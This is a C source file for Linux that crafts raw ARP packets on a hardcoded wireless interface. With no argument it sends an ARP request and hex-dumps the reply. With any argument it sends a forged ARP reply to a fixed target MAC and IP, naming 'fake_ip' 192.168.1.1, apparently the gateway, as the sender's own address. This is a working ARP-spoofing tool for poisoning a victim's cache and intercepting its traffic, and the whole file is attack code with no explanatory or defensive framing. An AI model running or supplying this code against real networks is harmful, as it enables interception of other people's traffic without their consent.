#include <stdio.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <arpa/inet.h>
#include <zconf.h>

#define INTERFACE "wlp3s0"
#define IOCERR(f) if ((f) < 0) exit(1)
#define SIZE_ARP (sizeof(struct ether_header) + sizeof(struct ether_arp))

int main(int argc, char **argv)
{
    int8_t type = ARPOP_REQUEST;

    uint8_t broadcast[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
//    uint8_t target_mac[ETH_ALEN] = {0x44, 0xac, 0x89, 0x93, 0x37, 0x4d}; An9
    uint8_t target_mac[ETH_ALEN] = {0xac, 0xc1, 0xee, 0x37, 0x1c, 0xc0};
    const char *target_ip = "192.168.1.12";
    const char *fake_ip = "192.168.1.1";


    if (argc > 1) type = ARPOP_REPLY;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return EXIT_FAILURE;
    uint8_t packet[UINT16_MAX];
    struct ether_header *eth = (struct ether_header *) packet;
    struct ether_arp *arp = (struct ether_arp *) (packet + sizeof(*eth));

    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
    strcpy(if_idx.ifr_name, INTERFACE);
    IOCERR(ioctl(fd, SIOCGIFINDEX, &if_idx));

    struct ifreq if_mac;
    memset(&if_mac, 0, sizeof(struct ifreq));
    strcpy(if_mac.ifr_name, INTERFACE);
    IOCERR(ioctl(fd, SIOCGIFHWADDR, &if_mac));

    struct ifreq if_ip;
    memset(&if_ip, 0, sizeof(struct ifreq));
    strcpy(if_ip.ifr_name, INTERFACE);
    IOCERR(ioctl(fd, SIOCGIFADDR, &if_ip));

    struct sockaddr_ll serv;
    socklen_t slen = sizeof(serv);
    memset(&serv, 0, slen);

    serv.sll_family = AF_PACKET;
    serv.sll_protocol = htons(ETH_P_ARP);
    serv.sll_ifindex = if_idx.ifr_ifindex;
    serv.sll_halen = ETH_ALEN;
    if (type == ARPOP_REQUEST) {
        memcpy(serv.sll_addr, broadcast, 6);
    } else {
        memcpy(serv.sll_addr, target_mac, 6);
    }

    memcpy(eth->ether_shost, if_mac.ifr_ifru.ifru_hwaddr.sa_data, ETH_ALEN);
    if (type == ARPOP_REQUEST)
        memcpy(eth->ether_dhost, broadcast, ETH_ALEN);
    else
        memcpy(eth->ether_dhost, target_mac, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);

    memset(arp, 0, sizeof(*arp));
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETH_P_IP);
    arp->arp_hln = ETH_ALEN;
    arp->arp_pln = 4;
    if (type == ARPOP_REQUEST) {
        arp->arp_op = htons(ARPOP_REQUEST);
    } else {
        arp->arp_op = htons(ARPOP_REPLY);
    }

    in_addr_t target_addr = inet_addr(target_ip);
    in_addr_t fake_addr = inet_addr(fake_ip);

    memcpy(arp->arp_sha, if_mac.ifr_ifru.ifru_hwaddr.sa_data, ETH_ALEN);
    if (type == ARPOP_REQUEST) {
        memcpy(arp->arp_spa, if_ip.ifr_ifru.ifru_addr.sa_data + 2, 4);
        memcpy(arp->arp_tha, broadcast, ETH_ALEN);
    } else {
        memcpy(arp->arp_spa, &fake_addr, 4);
        memcpy(arp->arp_tha, target_mac, ETH_ALEN);
    }
    memcpy(arp->arp_tpa, &target_addr, 4);

    if (sendto(fd, packet, SIZE_ARP, 0, (const struct sockaddr *) &serv, slen) <= 0) {
        perror("Send arp");
    }
    if (type == ARPOP_REPLY) goto end;
    int res;
    do {
        res = (int) recvfrom(fd, packet, SIZE_ARP, 0, NULL, &slen);
        if (eth->ether_type == (htons(ETH_P_ARP))) break;
    } while (1);
    printf("From: ");
    for (int i = 0; i < ETH_ALEN; ++i) printf("%02X%c", eth->ether_shost[i], (i == 5 ? '\n' : ':'));
    printf("To: ");
    for (int i = 0; i < ETH_ALEN; ++i) printf("%02X%c", eth->ether_dhost[i], (i == 5 ? '\n' : ':'));

    for (int i = 0; i < res; ++i) {
        printf("%02X%c", packet[i], ((i + 1) % 16 == 0 ? '\n' : ' '));
    }
    puts("");
    end:
    close(fd);
    return EXIT_SUCCESS;
}